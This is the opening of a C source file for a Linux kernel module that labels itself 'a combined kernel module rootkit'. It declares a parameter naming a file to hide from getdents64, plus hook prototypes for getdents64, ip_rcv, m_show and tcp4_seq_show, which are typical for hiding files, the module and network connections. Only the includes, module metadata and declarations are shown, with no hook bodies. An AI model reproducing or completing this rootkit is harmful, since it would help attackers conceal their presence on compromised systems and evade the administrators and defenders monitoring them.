#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <net/ip.h>
#include <linux/module.h>


char* file_to_hide; 
MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a combined kernel module rootkit");
MODULE_VERSION("1");

module_param(file_to_hide, charp, 0000);
MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall");

static asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
static asmlinkage int new_getdents64(const struct pt_regs *regs);

asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev);
asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev);

static asmlinkage int new_m_show(struct seq_file *m, void *p);
static asmlinkage int (*old_m_show)(struct seq_file *m, void *p);

static asmlinkage int (*old_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v);
